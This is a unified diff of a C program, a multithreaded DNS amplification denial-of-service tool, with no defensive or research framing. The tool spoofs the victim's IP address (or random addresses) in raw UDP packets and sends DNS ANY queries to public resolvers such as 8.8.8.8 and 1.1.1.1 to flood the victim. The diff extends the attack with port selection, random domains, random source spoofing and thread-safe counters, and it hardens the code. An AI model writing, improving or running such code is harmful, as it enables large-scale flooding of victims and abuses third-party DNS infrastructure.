@@ -11,29 +11,36 @@
 #include <fcntl.h>
 #include <errno.h>
 #include <signal.h>
+#include <stdatomic.h>
 
 #define MAX_THREADS 5000
 #define STATUS_UPDATE_INTERVAL 2
-#define DNS_QUERY_SIZE 64
+#define DNS_QUERY_SIZE 128
 #define MAX_DNS_SERVERS 100
+#define MAX_DOMAINS 5
+#define PACKETS_PER_SECOND 1000 // Rate limit per thread
 
 typedef struct {
     int thread_id;
-    volatile unsigned long *packet_count;
+    atomic_ulong *packet_count;
     volatile int *running;
     char dns_server[16];
     char target_ip[16];
+    int port;
     int query_id;
+    int spoof_random_ip;
 } thread_data_t;
 
 typedef struct {
     char target_ip[16];
+    int port;
     int duration;
     int thread_count;
     volatile int running;
-    unsigned long total_packets;
+    atomic_ulong total_packets;
     char dns_servers[MAX_DNS_SERVERS][16];
     int dns_server_count;
+    int spoof_random_ip;
 } config_t;
 
 config_t config;
@@ -54,37 +61,41 @@ void init_config(int argc, char *argv[]);
 void validate_arguments(void);
 void setup_signal_handlers(void);
 void handle_signal(int sig);
-void print_status(volatile unsigned long *packet_counts, int thread_count);
+void print_status(atomic_ulong *packet_counts, int thread_count);
 void *dns_amplification_thread(void *arg);
 unsigned long get_time_ms(void);
 void load_dns_servers(void);
 unsigned short checksum(unsigned short *ptr, int nbytes);
+void generate_random_ip(char *ip);
+void select_random_domain(char *qname, size_t qname_size);
 
 void print_banner(void) {
     printf("=========================================\n");
-    printf("        DNS AMPLIFICATION ATTACK TOOL\n");
+    printf("    ADVANCED DNS AMPLIFICATION TOOL\n");
     printf("=========================================\n");
 }
 
 void init_config(int argc, char *argv[]) {
-    if (argc < 3) {
-        printf("Usage: %s <TARGET_IP> <DURATION> [THREADS]\n", argv[0]);
-        printf("Example: %s 192.168.1.100 60 1000\n", argv[0]);
+    if (argc < 4) {
+        printf("Usage: %s <TARGET_IP> <PORT> <DURATION> [THREADS] [RANDOM_IP]\n", argv[0]);
+        printf("Example: %s 192.168.1.100 53 60 1000 1\n", argv[0]);
         exit(EXIT_FAILURE);
     }
     
     strncpy(config.target_ip, argv[1], sizeof(config.target_ip) - 1);
-    config.duration = atoi(argv[2]);
-    config.thread_count = (argc > 3) ? atoi(argv[3]) : 1000;
+    config.target_ip[sizeof(config.target_ip) - 1] = '\0';
+    config.port = atoi(argv[2]);
+    config.duration = atoi(argv[3]);
+    config.thread_count = (argc > 4) ? atoi(argv[4]) : 1000;
+    config.spoof_random_ip = (argc > 5) ? atoi(argv[5]) : 0;
     config.running = 0;
-    config.total_packets = 0;
+    atomic_init(&config.total_packets, 0);
     config.dns_server_count = 0;
     
     load_dns_servers();
 }
 
 void load_dns_servers(void) {
-    // List of public DNS servers for amplification
     const char *servers[] = {
         "8.8.8.8", "8.8.4.4",                   // Google DNS
         "1.1.1.1", "1.0.0.1",                   // Cloudflare
@@ -106,6 +117,7 @@ void load_dns_servers(void) {
     int count = sizeof(servers) / sizeof(servers[0]);
     for (int i = 0; i < count && i < MAX_DNS_SERVERS; i++) {
         strncpy(config.dns_servers[i], servers[i], sizeof(config.dns_servers[i]) - 1);
+        config.dns_servers[i][sizeof(config.dns_servers[i]) - 1] = '\0';
         config.dns_server_count++;
     }
     
@@ -120,6 +132,11 @@ void validate_arguments(void) {
     
     if (config.thread_count < 1 || config.thread_count > MAX_THREADS) {
         fprintf(stderr, "Error: Thread count must be between 1 and %d\n", MAX_THREADS);
+        exit(EXIT_FAILURE);
+    }
+    
+    if (config.port < 1 || config.port > 65535) {
+        fprintf(stderr, "Error: Port must be between 1 and 65535\n");
         exit(EXIT_FAILURE);
     }
     
@@ -140,24 +157,27 @@ void handle_signal(int sig) {
     config.running = 0;
 }
 
-void print_status(volatile unsigned long *packet_counts, int thread_count) {
+void print_status(atomic_ulong *packet_counts, int thread_count) {
     static int update_count = 0;
     unsigned long total = 0;
     
     for (int i = 0; i < thread_count; i++) {
-        total += packet_counts[i];
+        total += atomic_load(&packet_counts[i]);
     }
     
-    printf("[%02d] Total amplified packets: %lu | Current PPS: %.2f\n", 
-           ++update_count, total, (float)total / ((update_count) * STATUS_UPDATE_INTERVAL));
+    time_t now = time(NULL);
+    char timestamp[20];
+    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
+    
+    printf("[%s][%02d] Total amplified packets: %lu | Current PPS: %.2f\n", 
+           timestamp, ++update_count, total, (float)total / ((update_count) * STATUS_UPDATE_INTERVAL));
 }
 
 unsigned short checksum(unsigned short *ptr, int nbytes) {
-    register long sum;
+    register long sum = 0;
     unsigned short oddbyte;
     register short answer;
 
-    sum = 0;
     while (nbytes > 1) {
         sum += *ptr++;
         nbytes -= 2;
@@ -165,7 +185,7 @@ unsigned short checksum(unsigned short *ptr, int nbytes) {
 
     if (nbytes == 1) {
         oddbyte = 0;
-        *((u_char*)&oddbyte) = *(u_char*)ptr;
+        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
         sum += oddbyte;
     }
 
@@ -176,10 +196,27 @@ unsigned short checksum(unsigned short *ptr, int nbytes) {
     return answer;
 }
 
+void generate_random_ip(char *ip) {
+    snprintf(ip, 16, "%d.%d.%d.%d", 
+             rand() % 256, rand() % 256, rand() % 256, rand() % 256);
+}
+
+void select_random_domain(char *qname, size_t qname_size) {
+    const char *domains[] = {
+        "\x06google\x03com\x00",
+        "\x07youtube\x03com\x00",
+        "\x08facebook\x03com\x00",
+        "\x06amazon\x03com\x00",
+        "\x07twitter\x03com\x00"
+    };
+    int index = rand() % MAX_DOMAINS;
+    strncpy(qname, domains[index], qname_size - 1);
+    qname[qname_size - 1] = '\0';
+}
+
 void *dns_amplification_thread(void *arg) {
     thread_data_t *data = (thread_data_t *)arg;
     
-    // Create raw socket for IP spoofing
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (sock < 0) {
         perror("Raw socket creation failed");
@@ -187,52 +224,44 @@ void *dns_amplification_thread(void *arg) {
     }
     
     int one = 1;
-    const int *val = &one;
-    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
+    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
         perror("setsockopt failed");
         close(sock);
         return NULL;
     }
     
-    // Prepare DNS query (ANY query for maximum amplification)
     char dns_query[DNS_QUERY_SIZE];
     struct dns_header *dns_hdr = (struct dns_header *)dns_query;
     
-    // Initialize DNS header
     dns_hdr->id = htons(data->query_id);
     dns_hdr->flags = htons(0x0100); // Standard query
-    dns_hdr->qdcount = htons(1);    // One question
+    dns_hdr->qdcount = htons(1);
     dns_hdr->ancount = 0;
     dns_hdr->nscount = 0;
     dns_hdr->arcount = 0;
     
-    // Add question (google.com for large response)
     char *qname = dns_query + sizeof(struct dns_header);
-    strcpy(qname, "\x06google\x03com\x00"); // google.com
-    unsigned short *qtype = (unsigned short *)(qname + strlen("\x06google\x03com\x00") + 1);
-    *qtype = htons(0x00ff); // ANY query type for maximum amplification
+    select_random_domain(qname, DNS_QUERY_SIZE - sizeof(struct dns_header));
     
+    unsigned short *qtype = (unsigned short *)(qname + strlen(qname) + 1);
+    *qtype = htons(0x00ff); // ANY query
     unsigned short *qclass = qtype + 1;
     *qclass = htons(0x0001); // IN class
     
-    int query_len = sizeof(struct dns_header) + strlen("\x06google\x03com\x00") + 1 + 4;
+    int query_len = sizeof(struct dns_header) + strlen(qname) + 1 + 4;
     
-    // Prepare IP and UDP headers
     char packet[4096];
     struct iphdr *ip = (struct iphdr *)packet;
     struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
     char *payload = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
     
-    // Copy DNS query to payload
     memcpy(payload, dns_query, query_len);
     
-    // Set up UDP header
-    udp->source = htons(53); // Spoof source port as DNS
-    udp->dest = htons(53);   // Destination port DNS
+    udp->source = htons(1024 + (rand() % 64512)); // Random source port
+    udp->dest = htons(data->port);
     udp->len = htons(sizeof(struct udphdr) + query_len);
-    udp->check = 0; // Will be calculated later
+    udp->check = 0;
     
-    // Set up IP header
     ip->version = 4;
     ip->ihl = 5;
     ip->tos = 0;
@@ -242,31 +271,43 @@ void *dns_amplification_thread(void *arg) {
     ip->ttl = 255;
     ip->protocol = IPPROTO_UDP;
     ip->check = 0;
-    ip->saddr = inet_addr(data->target_ip); // Spoof source IP as target
-    ip->daddr = inet_addr(data->dns_server); // DNS server
-    
-    // Calculate IP checksum
-    ip->check = checksum((unsigned short *)ip, sizeof(struct iphdr));
     
     struct sockaddr_in sin;
     sin.sin_family = AF_INET;
-    sin.sin_port = htons(53);
+    sin.sin_port = htons(data->port);
     sin.sin_addr.s_addr = inet_addr(data->dns_server);
     
+    struct timespec sleep_time;
+    sleep_time.tv_sec = 0;
+    sleep_time.tv_nsec = (1000000000 / PACKETS_PER_SECOND);
+    
     while (*(data->running)) {
-        // Update query ID for each packet
         dns_hdr->id = htons(rand() % 65535);
         ip->id = htons(rand() % 65535);
-        ip->saddr = inet_addr(data->target_ip); // Keep spoofing target IP
         
-        // Send the spoofed DNS query
+        char src_ip[16];
+        if (data->spoof_random_ip) {
+            generate_random_ip(src_ip);
+            ip->saddr = inet_addr(src_ip);
+        } else {
+            ip->saddr = inet_addr(data->target_ip);
+        }
+        ip->daddr = inet_addr(data->dns_server);
+        
+        select_random_domain(qname, DNS_QUERY_SIZE - sizeof(struct dns_header));
+        query_len = sizeof(struct dns_header) + strlen(qname) + 1 + 4;
+        memcpy(payload, dns_query, query_len);
+        udp->len = htons(sizeof(struct udphdr) + query_len);
+        ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + query_len;
+        
+        ip->check = checksum((unsigned short *)ip, sizeof(struct iphdr));
+        
         if (sendto(sock, packet, ip->tot_len, 0, 
                   (struct sockaddr *)&sin, sizeof(sin)) > 0) {
-            (*(data->packet_count))++;
+            atomic_fetch_add(data->packet_count, 1);
         }
         
-        // Small delay to avoid overwhelming the system
-        usleep(10);
+        nanosleep(&sleep_time, NULL);
     }
     
     close(sock);
@@ -282,7 +323,7 @@ unsigned long get_time_ms(void) {
 int main(int argc, char *argv[]) {
     pthread_t *threads = NULL;
     thread_data_t *thread_data = NULL;
-    volatile unsigned long *packet_counts = NULL;
+    atomic_ulong *packet_counts = NULL;
     unsigned long start_time, current_time, elapsed_time;
     
     print_banner();
@@ -290,42 +331,51 @@ int main(int argc, char *argv[]) {
     validate_arguments();
     setup_signal_handlers();
     
-    printf("[+] Target: %s\n", config.target_ip);
+    printf("[+] Target: %s:%d\n", config.target_ip, config.port);
     printf("[+] Duration: %d seconds\n", config.duration);
     printf("[+] Threads: %d\n", config.thread_count);
     printf("[+] DNS Servers: %d\n", config.dns_server_count);
+    printf("[+] Random IP Spoofing: %s\n", config.spoof_random_ip ? "Enabled" : "Disabled");
     printf("[+] Starting DNS amplification attack...\n\n");
     
-    // Allocate memory
     threads = malloc(config.thread_count * sizeof(pthread_t));
     thread_data = malloc(config.thread_count * sizeof(thread_data_t));
-    packet_counts = malloc(config.thread_count * sizeof(unsigned long));
+    packet_counts = malloc(config.thread_count * sizeof(atomic_ulong));
     
     if (!threads || !thread_data || !packet_counts) {
         perror("Memory allocation failed");
+        free(threads);
+        free(thread_data);
+        free(packet_counts);
         return EXIT_FAILURE;
     }
     
-    // Initialize packet counters
-    memset((void*)packet_counts, 0, config.thread_count * sizeof(unsigned long));
+    for (int i = 0; i < config.thread_count; i++) {
+        atomic_init(&packet_counts[i], 0);
+    }
     
-    // Create worker threads
     srand(time(NULL));
     for (int i = 0; i < config.thread_count; i++) {
         thread_data[i].thread_id = i;
         thread_data[i].packet_count = &packet_counts[i];
         thread_data[i].running = &config.running;
         thread_data[i].query_id = rand() % 65535;
+        thread_data[i].port = config.port;
+        thread_data[i].spoof_random_ip = config.spoof_random_ip;
         
-        // Assign DNS server in round-robin fashion
         strncpy(thread_data[i].dns_server, 
                 config.dns_servers[i % config.dns_server_count],
                 sizeof(thread_data[i].dns_server) - 1);
+        thread_data[i].dns_server[sizeof(thread_data[i].dns_server) - 1] = '\0';
         
         strncpy(thread_data[i].target_ip, config.target_ip, sizeof(thread_data[i].target_ip) - 1);
+        thread_data[i].target_ip[sizeof(thread_data[i].target_ip) - 1] = '\0';
         
         if (pthread_create(&threads[i], NULL, dns_amplification_thread, (void*)&thread_data[i]) != 0) {
             perror("Thread creation failed");
+            free(threads);
+            free(thread_data);
+            free(packet_counts);
             return EXIT_FAILURE;
         }
     }
@@ -333,7 +383,6 @@ int main(int argc, char *argv[]) {
     config.running = 1;
     start_time = get_time_ms();
     
-    // Main control loop
     while (config.running) {
         sleep(STATUS_UPDATE_INTERVAL);
         print_status(packet_counts, config.thread_count);
@@ -347,15 +396,13 @@ int main(int argc, char *argv[]) {
         }
     }
     
-    // Wait for threads to finish
     for (int i = 0; i < config.thread_count; i++) {
         pthread_join(threads[i], NULL);
     }
     
-    // Calculate statistics
     unsigned long total_packets = 0;
     for (int i = 0; i < config.thread_count; i++) {
-        total_packets += packet_counts[i];
+        total_packets += atomic_load(&packet_counts[i]);
     }
     
     printf("\n[+] Attack completed!\n");
@@ -365,7 +412,7 @@ int main(int argc, char *argv[]) {
     
     free(threads);
     free(thread_data);
-    free((void*)packet_counts);
+    free(packet_counts);
     
     return EXIT_SUCCESS;
 }
